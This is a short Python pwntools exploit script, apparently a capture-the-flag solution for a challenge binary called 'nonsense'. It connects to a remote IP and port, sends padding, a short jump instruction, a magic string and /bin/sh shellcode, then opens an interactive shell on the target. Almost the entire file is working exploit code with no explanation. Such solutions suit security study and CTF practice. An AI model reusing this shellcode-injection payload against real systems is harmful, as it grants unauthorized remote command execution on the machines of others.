#!/usr/bin/env python
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft

c = remote('60.250.197.227', 10001)
#c = process('./nonsense-8ccbca2ca7f8825c843596a09c0806275a5b3fdf1c6c570bc0276fb0afc9210c')
e = ELF('./nonsense-8ccbca2ca7f8825c843596a09c0806275a5b3fdf1c6c570bc0276fb0afc9210c')

context.terminal = ['alacritty', '-e', 'sh', '-c']
#gdb.attach(c)

#init
context.os='linux'
context.arch='amd64'
# context.log_level ='debug'

shell = shellcraft.sh()
print(asm(shell))
# "\xeb",     # JMP rel8 
print(disasm(b"\x77\x20"))

ans = b'1' * 15 + b'\n'
#ans += b'\xeb\x25' # jmp
# ans += b'\x25' # jmp
ans += b"\x77\x20"
ans += b"wubbalubbadubdub"
ans += b'1' * 16
ans += asm(shell) # put shellcode to message

c.sendline(ans)

c.interactive()
c.close()
